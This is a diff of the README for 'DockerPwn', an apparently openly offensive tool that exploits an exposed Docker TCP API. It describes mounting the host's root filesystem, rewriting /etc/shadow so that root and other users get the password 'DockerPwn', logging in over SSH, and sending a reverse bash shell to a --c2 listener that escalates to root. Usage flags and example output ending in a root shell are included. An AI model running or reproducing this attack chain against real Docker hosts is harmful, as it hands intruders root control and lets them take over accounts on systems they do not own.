@@ -5,30 +5,38 @@ Automation for abusing an exposed Docker TCP Socket.
 This will automatically create a container on the Docker host with the host's root filesystem mounted,
 allowing arbitrary read and write of the host filesystem (which is bad).
 
-Once created, the script will empty the password requirement for 'root', and will alter any user
-with a valid Unix password to have a password of 'DockerPwn'
+Once created, the script will employ the method of your choosing for obtaining a root shell. Currently,
+only shadow is working - this alters root's hash in /etc/shadow to reflect a password of 'DockerPwn', as well
+as any other user with a valid SHA512 Unix hash in /etc/shadow.
 
 Once this is done, the script will attempt to use Paramiko to login to all users enumerated from 
-/etc/passwd using the password 'DockerPwn', and a shell will be spawned. 
+/etc/passwd using the password 'DockerPwn'. Once a valid login is discovered, a reverse shell will be sent
+to the built-in handler using /bin/bash. The built-in handler will then automatically obtain a PTY, escalate to root,
+and clear the screen.
+
+Shell I/O is logged for convenience and output to ./DockerPwn.log
 
 ## Roadmap:
 
-Utilize the limited command execution via Paramiko to get a better shell, and automatically escalate to root.
-
+Implement chroot method, bin method for quieter operation.
 
 ## Usage:
 ```
-DockerPwn.py [-h] [--target TARGET] [--port PORT]
+DockerPwn.py [-h] [--target TARGET] [--port PORT] [--image IMAGE] [--method METHOD] [--c2 C2]
 
 optional arguments:
   -h, --help       show this help message and exit
   --target TARGET  IP of Docker Host
   --port PORT      Docker API TCP Port
+  --image IMAGE    Docker image to use. Default is Alpine Linux.
+  --method METHOD  Method to use. Valid methods are shadow, chroot, binary. Default is shadow.
+  --c2 C2          Local IP and port in [IP]:[PORT] format to receive the shell.
  ```
 ## Example Output:
 
 ```
-Dylans-MacBook-Pro:~ dylan$ /usr/local/bin/python3 /Users/dylan/Documents/DockerPwn.py --target 192.168.0.20 --port 2375
+Dylans-MacBook-Pro:DockerPwn.py dylan$ /usr/local/bin/python3 /Users/dylan/Documents/GitHub/DockerPwn.py/DockerPwn.py --target 192.168.0.21 --port 2375 --c2 192.168.0.17:8080
+
 
 [+] Successfully probed the API. Writing out list of containers just in case there's something cool.
 
@@ -38,57 +46,25 @@ Dylans-MacBook-Pro:~ dylan$ /usr/local/bin/python3 /Users/dylan/Documents/Docker
 
 [+] Alright, creating Alpine Linux Container now...
 
-[+] Success! Created container with root volume mounted. Got ID 40b99b62bfb89181985fb38d1e2c4928efc22d72f48e83f989f2e822cf19bb5c!
+[+] Success! Created container with root volume mounted. Got ID a8f4825a694cd38da7858949a6e4cbfc3deb10a17bdb93600fcdf8de2d67f962!
 
-[+] Starting container 40b99b62bfb89181985fb38d1e2c4928efc22d72f48e83f989f2e822cf19bb5c
+[+] Starting container a8f4825a694cd38da7858949a6e4cbfc3deb10a17bdb93600fcdf8de2d67f962
 
 [+] Container successfully started. Blue team will be with you shortly.
 
 [+] Phew, alright. Creating the EXEC to change passwords.
 
-[+] EXEC successfully created on container! Got ID bc5ee929577554b9bc573b33c4a7e811542657a6aaeba6791d07bbdcc602103f!
+[+] EXEC successfully created on container! Got ID 8d306c62296e56a3560013636cd899de8072f9fb9c535e3af02d88359a258156!
 
 [+] Now triggering the EXEC to change passwords. Hope SSH is open...
 
 [+] EXEC successfully triggered. Printing users found in /etc/passwd.
 
-[!] User List: root daemon bin sys sync games man lp mail news uucp proxy www-data backup list irc gnats nobody systemd-network systemd-resolve syslog messagebus _apt lxd uuidd dnsmasq landscape pollinate sshd dylan
+[!] User List: dylan sshd pollinate landscape dnsmasq uuidd lxd _apt messagebus syslog systemd-resolve systemd-network nobody gnats irc list backup www-data proxy uucp news mail lp man games sync sys bin daemon root
 
-[+] OK, looking good. Attempting to open shell as root. This may take a minute or two.
-
-[-] Login failed for root
-[-] Login failed for daemon
-[-] Login failed for bin
-[-] Login failed for sys
-[-] Login failed for sync
-[-] Login failed for games
-[-] Login failed for man
-[-] Login failed for lp
-[-] Login failed for mail
-[-] Login failed for news
-[-] Login failed for uucp
-[-] Login failed for proxy
-[-] Login failed for www-data
-[-] Login failed for backup
-[-] Login failed for list
-[-] Login failed for irc
-[-] Login failed for gnats
-[-] Login failed for nobody
-[-] Login failed for systemd-network
-[-] Login failed for systemd-resolve
-[-] Login failed for syslog
-[-] Login failed for messagebus
-[-] Login failed for _apt
-[-] Login failed for lxd
-[-] Login failed for uuidd
-[-] Login failed for dnsmasq
-[-] Login failed for landscape
-[-] Login failed for pollinate
-[-] Login failed for sshd
-[+] Login succeeded for dylan!
-
-DockerPwn@192.168.0.20> id
-uid=1000(dylan) gid=1000(dylan) groups=1000(dylan),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
-
-DockerPwn@192.168.0.20> 
+root@ubuntuserver:/home/dylan# id; hostname; date
+uid=0(root) gid=0(root) groups=0(root)
+ubuntuserver
+Mon Nov 25 01:19:37 UTC 2019
+root@ubuntuserver:/home/dylan# 
 ```
